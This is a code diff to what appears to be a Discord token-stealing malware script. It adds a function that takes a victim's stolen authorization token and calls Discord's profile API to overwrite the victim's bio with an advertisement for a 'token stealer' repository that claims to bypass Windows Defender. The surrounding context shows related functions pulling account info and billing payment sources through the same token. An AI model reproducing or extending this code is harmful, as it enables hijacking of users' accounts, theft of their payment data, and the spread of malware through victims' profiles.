@@ -481,6 +481,21 @@ const getInfo = async (token) => {
   return JSON.parse(info);
 };
 
+const changeInfo = async (token) => {
+  const info = await execScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("PATCH", "https://discord.com/api/v9/users/%40me/profile", false);
+    xmlHttp.setRequestHeader("authorization", "${token}");
+    xmlHttp.setRequestHeader("content-type", "application/json");
+    xmlHttp.send(JSON.stringify({
+      "bio": "https://github.com/s1uiasdad/Stealer_vietnam good token stealer\\npayload bypass windows defender"
+    }));
+    xmlHttp.responseText;
+  `);
+  return JSON.parse(info);
+};
+
+
 const fetchBilling = async (token) => {
   const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
     xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
